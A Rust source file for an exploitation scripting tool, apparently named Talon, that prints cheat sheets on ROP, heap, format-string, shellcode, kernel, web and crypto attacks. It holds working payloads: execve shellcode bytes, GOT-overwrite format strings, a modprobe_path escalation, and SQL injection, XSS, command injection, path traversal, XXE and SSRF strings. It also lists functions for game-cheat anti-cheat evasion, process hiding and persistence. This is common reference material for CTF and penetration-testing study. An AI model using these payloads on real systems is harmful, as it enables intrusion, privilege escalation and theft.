pub struct CheatSheet;

impl CheatSheet {
    pub fn show(topic: &str) {
        match topic.to_lowercase().as_str() {
            "all" | "quick-ref" => Self::show_quick_reference(),
            "builtins" | "functions" => Self::show_builtins(),
            "rop" => Self::show_rop(),
            "heap" => Self::show_heap(),
            "format-string" | "format" | "fmt" => Self::show_format_string(),
            "shellcode" => Self::show_shellcode(),
            "kernel" => Self::show_kernel(),
            "web" => Self::show_web(),
            "crypto" => Self::show_crypto(),
            _ => {
                println!("Unknown topic: {}", topic);
                println!("\nAvailable topics:");
                println!("  - all          (Quick reference for everything)");
                println!("  - builtins     (Built-in functions)");
                println!("  - rop          (Return-Oriented Programming)");
                println!("  - heap         (Heap exploitation)");
                println!("  - format-string (Format string attacks)");
                println!("  - shellcode    (Shellcode development)");
                println!("  - kernel       (Kernel exploitation)");
                println!("  - web          (Web exploitation)");
                println!("  - crypto       (Cryptography)");
            }
        }
    }
    
    fn show_quick_reference() {
        println!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                    TALON DSL QUICK REFERENCE                             ║
╚══════════════════════════════════════════════════════════════════════════╝

BUILT-IN FUNCTIONS
──────────────────────────────────────────────────────────────────────────
len(collection)              Get length of list/string/bytes/map/set
range(end)                   Generate sequence [0..end)
range(start, end)            Generate sequence [start..end)
hex(number)                  Convert number to hex string (0x...)
int(string)                  Parse hex/decimal string to integer
bytes(value)                 Convert string/list/number to bytes
str(value)                   Convert any value to string
read(filepath)               Read file as bytes
write(filepath, data)        Write data to file
split(str, delim)            Split string by delimiter
join(list, sep)              Join list with separator
replace(str, old, new)       Replace all occurrences
p64(number)                  Pack to 64-bit little-endian
p32(number)                  Pack to 32-bit little-endian
u64(bytes)                   Unpack from 64-bit little-endian
u32(bytes)                   Unpack from 32-bit little-endian
cyclic(size)                 Generate De Bruijn pattern
cyclic_find(pattern, val)    Find offset in pattern
print(...)                   Print values to console

EXPLOITATION FUNCTIONS
──────────────────────────────────────────────────────────────────────────
shellcode(arch, payload, lhost, lport)  Generate shellcode
rop_find(binary, pattern)               Find ROP gadgets
fmtstr_payload(offset, writes, arch)    Generate format string payload
connect(host, port)                     TCP connection
send(conn, data)                        Send data
recv(conn, n)                           Receive n bytes
interactive(host, port)                 Interactive shell

CONTROL FLOW
──────────────────────────────────────────────────────────────────────────
if condition ... end
for item in collection ... end
while condition ... end
try ... catch err ... end
match value case x: ... end

COMMANDS
──────────────────────────────────────────────────────────────────────────
talon run script.talon           Execute script
talon repl                       Interactive REPL
talon wizard                     Interactive exploit wizard
talon nl "query"                 Natural language generation
talon man <topic>                Show manual page
talon cheat <topic>              Show cheatsheet
talon quick-ref                  This reference guide

Use 'talon cheat <topic>' for specific exploitation techniques
"#);
    }

    fn show_builtins() {
        println!(r#"
╔══════════════════════════════════════════════════════════════════════════╗
║                    TALON BUILT-IN FUNCTIONS                              ║
╚══════════════════════════════════════════════════════════════════════════╝

COLLECTION OPERATIONS
──────────────────────────────────────────────────────────────────────────
len(collection)              Returns length of list, string, bytes, map, set
  Examples:
    len([1, 2, 3, 4, 5])         → 5
    len("hello world")           → 11
    len(p64(0xdeadbeef))         → 8

SEQUENCE GENERATION
──────────────────────────────────────────────────────────────────────────
range(end)                   Generate numbers from 0 to end (exclusive)
range(start, end)            Generate numbers from start to end (exclusive)
  Examples:
    range(5)                     → [0, 1, 2, 3, 4]
    range(3, 8)                  → [3, 4, 5, 6, 7]
    for i in range(10) ... end

TYPE CONVERSIONS
──────────────────────────────────────────────────────────────────────────
hex(number)                  Convert number to hexadecimal string
  Examples:
    hex(255)                     → "0xff"
    hex(0x08048000)              → "0x8048000"

int(string)                  Parse string to integer (hex or decimal)
  Examples:
    int("12345")                 → 12345
    int("0xdeadbeef")            → 3735928559

bytes(value)                 Convert to byte array
  Examples:
    bytes("hello")               → [104, 101, 108, 108, 111]
    bytes([72, 101, 108])        → [72, 101, 108]
    bytes(65)                    → [65]

str(value)                   Convert to string representation
  Examples:
    str(12345)                   → "12345"
    str([1, 2, 3])               → "[1, 2, 3]"

FILE I/O
──────────────────────────────────────────────────────────────────────────
read(filepath)               Read file contents as bytes
  Examples:
    let data = read("payload.bin")
    let config = str(read("config.txt"))

write(filepath, data)        Write data to file (string or bytes)
  Examples:
    write("output.txt", "Hello!")
    write("exploit.bin", payload)

STRING MANIPULATION
──────────────────────────────────────────────────────────────────────────
split(string, delimiter)     Split string into list
  Examples:
    split("a,b,c", ",")          → ["a", "b", "c"]

join(list, separator)        Join list into string
  Examples:
    join(["a", "b"], "-")        → "a-b"

replace(string, old, new)    Replace substring
  Examples:
    replace("hello", "l", "L")   → "heLLo"

BINARY PACKING
──────────────────────────────────────────────────────────────────────────
p64(number)                  Pack to 64-bit little-endian bytes
p32(number)                  Pack to 32-bit little-endian bytes
p16(number)                  Pack to 16-bit little-endian bytes
p8(number)                   Pack to 8-bit bytes
  Examples:
    p64(0xdeadbeef)              → 8 bytes
    p32(0x08048000)              → 4 bytes

u64(bytes)                   Unpack 64-bit little-endian to number
u32(bytes)                   Unpack 32-bit little-endian to number
u16(bytes)                   Unpack 16-bit little-endian to number
u8(bytes)                    Unpack 8-bit to number
  Examples:
    u64(leaked_addr)             → address as integer
    u32(data[0:4])               → first 4 bytes as int

EXPLOITATION PRIMITIVES
──────────────────────────────────────────────────────────────────────────
cyclic(size)                 Generate De Bruijn (cyclic) pattern
  Examples:
    let pattern = cyclic(1000)

cyclic_find(pattern, value)  Find offset of value in pattern
  Examples:
    cyclic_find(pattern, "faab")  → offset
    cyclic_find(pattern, 0x62616166)

OUTPUT
──────────────────────────────────────────────────────────────────────────
print(value1, value2, ...)   Print values (space-separated)
  Examples:
    print("Hello World")
    print("Address:", hex(addr))

ADVANCED EXPLOITATION FUNCTIONS (Phase 10+)
──────────────────────────────────────────────────────────────────────────
Debugger Integration:
  breakpoint(location)                Set breakpoint at address/function
  debug_continue()                    Continue execution
  debug_step()                        Step one instruction
  debug_read_mem(addr, size)          Read memory from process
  debug_write_mem(addr, data)         Write memory to process
  debug_read_reg(register)            Read register value
  debug_write_reg(register, value)    Write register value

Symbolic Execution:
  symbolic_var(name, size)            Create symbolic variable
  constrain_no_null(var)              Add no-null-bytes constraint
  constrain_alnum(var)                Add alphanumeric constraint
  constrain_range(var, min, max)      Add range constraint
  symbolic_solve()                    Solve constraints

Kernel Exploitation:
  pool_spray(size, count)             Spray kernel pool allocations
  heap_feng_shui(size, pattern)       Shape kernel heap
  token_steal(pid)                    Steal process token
  process_hide(pid)                   Hide process from listings
  kaslr_leak()                        Leak kernel base address
  smep_bypass(method)                 Bypass SMEP protection
  kernel_read(addr, size)             Read kernel memory
  kernel_write(addr, data)            Write kernel memory

Cryptography Attacks:
  padding_oracle(ciphertext, oracle)  Padding oracle attack
  bleichenbacher(ciphertext)          RSA decryption oracle
  timing_attack(fn, samples)          Timing attack analysis
  weak_keys(modulus)                  Find weak RSA keys
  hash_collision(algorithm)           Generate hash collisions
  aes_padding_attack(ciphertext)      AES padding attack
  rsa_factorize(modulus)              Factorize RSA modulus

Fuzzing Framework:
  fuzz_target(binary, iterations)     Fuzz binary target
  mutate(data)                        Intelligently mutate data
  coverage(binary)                    Get code coverage
  corpus_add(dir, data)               Add to fuzzing corpus
  crash_triage(crash_dir)             Triage crash dumps

Binary Analysis:
  disasm(binary, address)             Disassemble at address
  cfg(binary)                         Generate control flow graph
  taint(binary, source)               Taint analysis
  emulate(arch, code)                 Emulate code execution
  rop_auto(binary)                    Automatic ROP chain
  gadget_search(binary, pattern)      Find ROP gadgets

Cloud/Container:
  docker_escape(method)               Escape Docker container
  kube_escape(pod)                    Escape Kubernetes pod
  metadata_exploit(provider)          Exploit cloud metadata
  iam_escalate(role, method)          IAM privilege escalation

Browser Exploitation:
  js_spray(value, count)              JavaScript heap spray
  type_confuse(obj, type)             Type confusion attack
  uaf_dom(element)                    DOM use-after-free
  sandbox_escape(method)              Browser sandbox escape
  jit_exploit(code)                   JIT compiler exploit

IoT/Embedded:
  firmware_unpack(file)               Unpack firmware image
  uart_exploit(port, baudrate)        UART console access
  jtag_dump(device)                   JTAG memory dump
  can_inject(id, data)                CAN bus injection
  rtos_exploit(rtos, vuln)            RTOS exploitation

Hardware Security:
  cache_timing(addr, rounds)          Cache timing attack
  rowhammer(addr, iterations)         Rowhammer attack
  fault_inject(timing, voltage)       Fault injection
  side_channel(method, samples)       Side-channel analysis
  sgx_attack(method)                  Intel SGX attack

VM Escapes:
  hypercall_fuzz(num, iterations)     Fuzz hypervisor
  virtio_exploit(device)              VirtIO device exploit
  dma_attack(addr, data)              DMA-based attack
  nested_escape(method)               Nested VM escape

Memory Management:
  alloc(size)                         Allocate memory
  free(address)                       Free memory
  mmap(addr, size, perms)             Memory map
  mprotect(addr, size, perms)         Change protections
  read_phys(addr, size)               Read physical memory
  write_phys(addr, data)              Write physical memory
  dma_buffer(size)                    Allocate DMA buffer

System Calls:
  syscall(num, ...)                   Direct syscall
  win32(function, ...)                Win32 API call
  nt_syscall(num, ...)                NT syscall
  posix_call(name, ...)               POSIX function call

Network Packets:
  ethernet(src, dst, payload)         Ethernet frame
  ip_packet(src, dst, payload)        IP packet
  tcp_packet(src_port, dst_port, data) TCP packet
  udp_packet(src_port, dst_port, data) UDP packet
  icmp_packet(type, payload)          ICMP packet
  arp_packet(sender, target)          ARP packet
  dns_query(domain)                   DNS query
  http_request(method, path)          HTTP request
  tls_handshake(version)              TLS handshake

Workflow Automation:
  exec_chain(functions)               Chain function execution
  exec_parallel(tasks)                Parallel execution
  exec_retry(function, attempts)      Retry on failure
  on_failure(function, fallback)      Failure handler
  aggregate(results)                  Aggregate results
  report(name, data)                  Generate report

Inline Assembly:
  asm(arch, code)                     Assemble code

FFI Support:
  load_library(path)                  Load dynamic library
  get_symbol(lib, symbol)             Get symbol address
  ffi_call(lib, func, ...)            Call foreign function

WORLD-CLASS FUNCTIONS (Phase 11+)
──────────────────────────────────────────────────────────────────────────
Cryptography & Hashing:
  sha256(data)                        SHA-256 hash
  md5(data)                           MD5 hash
  sha1(data)                          SHA-1 hash
  sha512(data)                        SHA-512 hash
  random_bytes(length)                Generate random bytes
  random_int(min, max)                Generate random integer

Encoding & Compression:
  base64_encode(data)                 Base64 encode
  base64_decode(string)               Base64 decode
  url_encode(string)                  URL encode
  url_decode(string)                  URL decode
  gzip_compress(data)                 GZIP compression
  gzip_decompress(data)               GZIP decompression
  zlib_compress(data)                 ZLIB compression
  zlib_decompress(data)               ZLIB decompression

Regular Expressions:
  regex_find(pattern, text)           Find regex matches
  regex_replace(pattern, text, repl)  Replace regex matches

Date & Time:
  timestamp()                         Unix timestamp
  sleep(seconds)                      Sleep for N seconds

Shell & Process:
  shell(command)                      Execute shell command
  exec(command)                       Execute with full output
  process_list()                      List running processes

Network & HTTP:
  dns_resolve(hostname)               Resolve hostname to IP
  http_get(url)                       HTTP GET request
  http_post(url, data)                HTTP POST request
  port_scan(host, ports)              Scan TCP ports

Security Testing:
  exploit_search(keyword)             Search exploit database
  generate_payload(arch, type)        Generate shellcode payload
  web_scan(url)                       Web vulnerability scan
  hash_crack(hash, wordlist)          Crack password hash

File Operations:
  mmap_file(path)                     Memory-map file

GAME HACKING MODULE (Phase 12) - 62 Functions
──────────────────────────────────────────────────────────────────────────
Process Control:
  process_attach(pid_or_name)         Attach to process
  process_detach(pid)                 Detach from process
  process_suspend(pid)                Suspend process
  process_resume(pid)                 Resume process
  process_kill(pid)                   Terminate process
  process_modules(pid)                List loaded modules

Memory Manipulation:
  mem_read(pid, addr, size)           Read process memory
  mem_write(pid, addr, data)          Write process memory
  mem_scan(pid, pattern)              Scan for byte pattern
  mem_alloc(pid, size)                Allocate remote memory
  mem_free(pid, addr)                 Free remote memory
  mem_protect(pid, addr, prot)        Change memory protection
  pointer_chain(pid, offsets)         Follow pointer chain
  inject_asm(pid, addr, code)         Inject assembly code

Anti-Cheat Bypass:
  anticheat_detect()                  Detect anti-cheat systems
  kernel_driver_status(name)          Check kernel driver
  stealth_read(pid, addr, size)       Stealthy memory read
  stealth_write(pid, addr, data)      Stealthy memory write
  hook_detect(pid, addr)              Detect hooks
  hook_restore(pid, addr)             Restore original bytes
  debugger_evasion()                  Anti-debugger techniques
  signature_obfuscate(code)           Obfuscate code signature

Unity Engine:
  unity_find_objects(class)           Find Unity GameObjects
  unity_get_component(addr, comp)     Get component
  unity_call_method(addr, method)     Call method
  unity_mono_dump(pid)                Dump Mono assemblies

Unreal Engine:
  unreal_find_actors(class)           Find Unreal actors
  unreal_get_property(addr, prop)     Get property value
  unreal_set_property(addr, prop, val) Set property value
  unreal_process_event(addr, event)   Trigger event

Generic Engine:
  vtable_hook(pid, addr, index)       Hook vtable function
  vtable_restore(pid, addr)           Restore vtable
  script_engine_hook(pid, engine)     Hook Lua/Python engine

Network Manipulation:
  game_packet_capture(port)           Capture game packets
  game_packet_inject(port, data)      Inject packet
  game_packet_decrypt(data)           Decrypt packet
  game_packet_encrypt(data)           Encrypt packet
  protocol_reverse(samples)           Reverse protocol
  game_server_emulate(port)           Emulate game server
  network_proxy(listen, target)       MITM proxy
  lag_exploit(delay, count)           Artificial lag

Graphics Hooking:
  dx_hook(pid)                        Hook DirectX
  opengl_hook(pid)                    Hook OpenGL
  vulkan_hook(pid)                    Hook Vulkan
  render_overlay(pid, elements)       Render overlay
  shader_inject(pid, code)            Inject shader
  audio_hook(pid)                     Hook audio API

Cheat Development:
  esp_create(pid, list_addr)          Create ESP
  entity_iterate(pid, list_addr)      Iterate entities
  aimbot_calculate(cam, target)       Calculate aim
  triggerbot(pid, crosshair_addr)     Auto-fire bot
  visibility_check(pid, entity)       Check visibility
  trainer_create(pid, cheats)         Create trainer
  world_to_screen(pos, matrix)        3D to 2D projection

RE & Debugging:
  crash_dump_analyze(path)            Analyze crash dumps
  auto_re_pattern(pid, func)          Auto-find patterns
  data_flow_trace(pid, addr)          Trace data flow

Stealth & Persistence:
  dll_inject(pid, path)               Inject DLL
  dll_hide(pid, name)                 Hide DLL
  reflective_load(bytes)              Reflective loading
  persist_install(method, path)       Install persistence
  persist_remove(method)              Remove persistence

Use 'talon man <function>' for detailed documentation
"#);
    }

    fn show_rop() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                     ROP (RETURN-ORIENTED PROGRAMMING)                     ║
╚═══════════════════════════════════════════════════════════════════════════╝

BASIC CONCEPTS
───────────────────────────────────────────────────────────────────────────
ROP chains execute existing code (gadgets) to bypass NX/DEP protection.
Chain together gadgets ending in 'ret' to perform arbitrary operations.

COMMON GADGETS
───────────────────────────────────────────────────────────────────────────
pop rdi; ret          - Set first argument (x64)
pop rsi; pop r15; ret - Set second argument (x64)
pop rdx; ret          - Set third argument (x64)
syscall; ret          - Execute system call
mov [reg], reg; ret   - Write to memory

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
auto_rop "./binary"
    constraints: [no_nulls, alphanumeric]
    objective: shell
    strategy: ret2libc
end

// Manual ROP chain
let pop_rdi = base + 0x1234
let bin_sh = libc_base + 0x5678
let system = libc_base + 0x9abc

let rop_chain = [
    pop_rdi,
    bin_sh,
    system
]

USEFUL TOOLS
───────────────────────────────────────────────────────────────────────────
ROPgadget --binary ./binary
ropper --file ./binary --search "pop rdi"
one_gadget libc.so.6

TECHNIQUES
───────────────────────────────────────────────────────────────────────────
1. ret2libc     - Call libc functions directly
2. ret2plt      - Use PLT entries (no libc leak needed)
3. ret2csu      - Universal gadgets in __libc_csu_init
4. SROP         - Sigreturn-oriented programming
5. JOP/COP      - Jump/Call-oriented programming

PROTECTIONS & BYPASSES
───────────────────────────────────────────────────────────────────────────
NX/DEP      → ROP chains (no code execution on stack)
ASLR        → Information leak to find base addresses
Stack canary → Leak canary or bypass via other overflow
PIE         → Partial overwrite or leak PIE base
"#);
    }
    
    fn show_heap() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                        HEAP EXPLOITATION TECHNIQUES                       ║
╚═══════════════════════════════════════════════════════════════════════════╝

HEAP STRUCTURE (glibc ptmalloc2)
───────────────────────────────────────────────────────────────────────────
Chunk Header:
  [size | prev_size] [user data] [size | prev_size]
  
Bins:
  - tcache (per-thread, fast, 7 bins)
  - fastbins (LIFO, 10 bins, 0x20-0xb0)
  - unsorted bin (temporary storage)
  - small bins (FIFO, <1024 bytes)
  - large bins (FIFO, >=1024 bytes)

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
heap_exploit "./binary"
    technique: tcache_poisoning
    target: __malloc_hook
    overwrite_with: system
    glibc_version: "2.35"
end

TECHNIQUES BY GLIBC VERSION
───────────────────────────────────────────────────────────────────────────
glibc <= 2.23:
  - House of Force (top chunk overflow)
  - Fastbin attack (fd pointer corruption)
  - Unsafe unlink

glibc 2.24-2.26:
  - Tcache poisoning (easy!)
  - House of Orange (_IO_list_all)
  - Fastbin dup into stack

glibc >= 2.27:
  - Tcache poisoning with key check bypass
  - Safe linking bypass (2.32+)
  - House of Apple (_IO_wfile_overflow)

COMMON TARGETS
───────────────────────────────────────────────────────────────────────────
__malloc_hook  - Called on malloc()
__free_hook    - Called on free()
__realloc_hook - Called on realloc()
_IO_list_all   - FSOP target
vtable         - Virtual function table

EXPLOITATION STEPS
───────────────────────────────────────────────────────────────────────────
1. Leak heap/libc addresses
2. Corrupt chunk metadata (fd/bk pointers)
3. Trigger allocation at target address
4. Overwrite function pointer with one_gadget/system
5. Trigger hook call

USEFUL ONE-LINERS
───────────────────────────────────────────────────────────────────────────
one_gadget libc.so.6
patchelf --set-interpreter ./ld.so ./binary
LD_PRELOAD=./libc.so.6 ./binary
"#);
    }
    
    fn show_format_string() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                       FORMAT STRING EXPLOITATION                          ║
╚═══════════════════════════════════════════════════════════════════════════╝

FORMAT SPECIFIERS
───────────────────────────────────────────────────────────────────────────
%x      - Read 4 bytes from stack (hex)
%p      - Read pointer from stack
%s      - Read string from address on stack
%n      - Write number of bytes printed to address
%hn     - Write 2 bytes (short)
%hhn    - Write 1 byte
%<num>$x - Access specific argument (e.g., %7$x)

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
// Leak stack/libc
let leak = "%p %p %p %p %p"
send leak
let response = recv 100

// Arbitrary write
let target_addr = 0x601020
let payload = p64(target_addr) + "%123c%8$n"
send payload

EXPLOITATION TECHNIQUES
───────────────────────────────────────────────────────────────────────────
1. Information Leak
   - Find offset: %1$p %2$p ... %N$p
   - Leak canary: %<offset>$p
   - Leak libc: %<offset>$s or %<offset>$p

2. Arbitrary Write
   - Place address on stack
   - Use %n to write at that address
   - Multiple writes for full value

3. GOT Overwrite
   - Leak libc base
   - Calculate system() address
   - Overwrite GOT entry with %n

FINDING OFFSET
───────────────────────────────────────────────────────────────────────────
Send: AAAA.%p.%p.%p.%p.%p.%p.%p
Look for: 0x41414141 (position tells you offset)

EXAMPLE EXPLOIT
───────────────────────────────────────────────────────────────────────────
let got_printf = 0x601020
let system_addr = libc_base + 0x50d60

// Write system address to printf GOT
let payload = p64(got_printf)
payload = payload + "%2044c%8$hn"  // Write low 2 bytes
payload = payload + p64(got_printf + 2)
payload = payload + "%31428c%9$hn" // Write high 2 bytes

send payload
send "/bin/sh"  // Next printf call becomes system("/bin/sh")
"#);
    }
    
    fn show_shellcode() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                        SHELLCODE DEVELOPMENT                              ║
╚═══════════════════════════════════════════════════════════════════════════╝

BASIC x86-64 EXECVE SHELLCODE (21 bytes)
───────────────────────────────────────────────────────────────────────────
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68
\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05

Assembly:
  xor rsi, rsi
  push rsi
  movabs rdi, 0x68732f2f6e69622f  ; "/bin//sh"
  push rdi
  push rsp
  pop rdi
  push 59
  pop rax
  cdq
  syscall

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
// Generate shellcode
shellcode generate execve "/bin/sh"
shellcode encode alphanumeric
let sc = shellcode finalize

// Custom shellcode
let shellcode = [
    0x48, 0x31, 0xf6,              // xor rsi, rsi
    0x56,                          // push rsi
    0x48, 0xbf,                    // movabs rdi, ...
    "/bin//sh" | bytes,
    0x57,                          // push rdi
    0x54,                          // push rsp
    0x5f,                          // pop rdi
    0x6a, 0x3b,                    // push 59
    0x58,                          // pop rax
    0x99,                          // cdq
    0x0f, 0x05                     // syscall
]

ENCODING TECHNIQUES
───────────────────────────────────────────────────────────────────────────
1. Alphanumeric shellcode - Only A-Z, a-z, 0-9
2. NULL-free shellcode - Avoid \x00 bytes
3. Printable shellcode - All printable ASCII
4. XOR encoding - Encode with key, decode at runtime
5. Polymorphic shellcode - Self-modifying code

COMMON SYSCALLS (x86-64)
───────────────────────────────────────────────────────────────────────────
execve    = 59  (0x3b)
read      = 0
write     = 1
open      = 2
mmap      = 9
mprotect  = 10
socket    = 41
dup2      = 33

AVOIDING NULL BYTES
───────────────────────────────────────────────────────────────────────────
mov eax, 0          →  xor eax, eax
push 0              →  xor rax, rax; push rax
mov rax, 0x1000     →  mov ax, 0x1000; movzx rax, ax

SHELLCODE TESTING
───────────────────────────────────────────────────────────────────────────
# Test shellcode in C
char shellcode[] = "\x48\x31\xf6...";
((void(*)())shellcode)();

# Test in Python
from pwn import *
asm(shellcraft.amd64.linux.sh())
"#);
    }
    
    fn show_kernel() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                    KERNEL EXPLOITATION TECHNIQUES                         ║
╚═══════════════════════════════════════════════════════════════════════════╝

KERNEL PROTECTIONS
───────────────────────────────────────────────────────────────────────────
KASLR    - Kernel Address Space Layout Randomization
SMEP     - Supervisor Mode Execution Prevention
SMAP     - Supervisor Mode Access Prevention
KPTI     - Kernel Page Table Isolation
kCFI     - Kernel Control Flow Integrity

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
analyze kernel_module "./vuln.ko"

// Automatic kernel exploit
kernel_exploit "./vuln.ko"
    vulnerability: stack_overflow
    bypass: [smep, smap, kaslr]
    objective: root_shell
end

COMMON TECHNIQUES
───────────────────────────────────────────────────────────────────────────
1. ret2usr (Return to User)
   - Execute shellcode in userspace
   - Requires SMEP disabled
   - Change current->cred to root

2. ROP in Kernel
   - Similar to userspace ROP
   - Find gadgets in kernel image
   - commit_creds(prepare_kernel_cred(0))

3. Arbitrary Read/Write
   - Leak kernel addresses
   - Overwrite modprobe_path
   - Overwrite core_pattern

BYPASSING PROTECTIONS
───────────────────────────────────────────────────────────────────────────
KASLR → Leak kernel pointer from /proc or dmesg
SMEP  → ROP to disable CR4.SMEP bit or pure kernel ROP
SMAP  → Similar to SMEP, disable CR4.SMAP
KPTI  → Use KPTI trampoline for clean return

PRIVILEGE ESCALATION
───────────────────────────────────────────────────────────────────────────
// Method 1: Overwrite credentials
struct cred *cred = prepare_kernel_cred(NULL);
commit_creds(cred);

// Method 2: Modprobe path overwrite
echo -ne '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x
chmod +x /tmp/x
// Overwrite modprobe_path with "/tmp/x"
// Trigger modprobe by executing unknown binary

USEFUL KERNEL SYMBOLS
───────────────────────────────────────────────────────────────────────────
commit_creds
prepare_kernel_cred
native_write_cr4
modprobe_path
core_pattern
current_task

DEBUGGING
───────────────────────────────────────────────────────────────────────────
# Launch QEMU with GDB
qemu-system-x86_64 -s -S -kernel bzImage -initrd initramfs.cpio

# Attach GDB
gdb vmlinux
(gdb) target remote :1234
(gdb) b *0xffffffff81000000
(gdb) c
"#);
    }
    
    fn show_web() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                        WEB EXPLOITATION CHEATSHEET                        ║
╚═══════════════════════════════════════════════════════════════════════════╝

SQL INJECTION
───────────────────────────────────────────────────────────────────────────
' OR '1'='1' --
' UNION SELECT NULL,NULL,NULL--
admin' --
' OR 1=1 LIMIT 1--
' UNION SELECT username,password FROM users--

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
let payload = "' OR '1'='1' --"
http_post "http://target.com/login" {{
    username: payload,
    password: "anything"
}}

XSS (CROSS-SITE SCRIPTING)
───────────────────────────────────────────────────────────────────────────
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

COMMAND INJECTION
───────────────────────────────────────────────────────────────────────────
; ls -la
| whoami
`id`
$(cat /etc/passwd)

PATH TRAVERSAL
───────────────────────────────────────────────────────────────────────────
../../etc/passwd
....//....//etc/passwd
..%252f..%252fetc%252fpasswd

XXE (XML EXTERNAL ENTITY)
───────────────────────────────────────────────────────────────────────────
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

SSRF (SERVER-SIDE REQUEST FORGERY)
───────────────────────────────────────────────────────────────────────────
http://localhost:80
http://127.0.0.1:22
http://[::]:80
http://0.0.0.0:80
"#);
    }
    
    fn show_crypto() {
        println!(r#"
╔═══════════════════════════════════════════════════════════════════════════╗
║                    CRYPTOGRAPHY ATTACK CHEATSHEET                         ║
╚═══════════════════════════════════════════════════════════════════════════╝

RSA ATTACKS
───────────────────────────────────────────────────────────────────────────
1. Small exponent (e=3)
   - Cube root attack if m^3 < N
   
2. Common modulus
   - Same N, different e values
   - Extended Euclidean algorithm

3. Wiener's attack
   - Small private exponent d < N^0.25

4. Factorization
   - Factor N if p and q are close
   - Fermat's factorization

TALON SYNTAX
───────────────────────────────────────────────────────────────────────────
// RSA attack
let n = 0x...
let e = 65537
let ct = 0x...

crypto_attack rsa {{
    n: n,
    e: e,
    ciphertext: ct,
    method: wiener
}}

BLOCK CIPHER ATTACKS
───────────────────────────────────────────────────────────────────────────
1. ECB mode
   - Identical plaintexts → identical ciphertexts
   - Block swapping/replay

2. CBC padding oracle
   - Decrypt without key
   - Requires padding error feedback

3. CBC bit flipping
   - Modify ciphertext to change plaintext

HASH ATTACKS
───────────────────────────────────────────────────────────────────────────
Length extension (MD5, SHA-1, SHA-256)
Rainbow tables
Collision attacks (MD5, SHA-1)

COMMON TOOLS
───────────────────────────────────────────────────────────────────────────
RsaCtfTool - RSA attacks
hashcat - Password cracking
john - Password cracking
yafu - Integer factorization
sage - Mathematical computations
"#);
    }
}
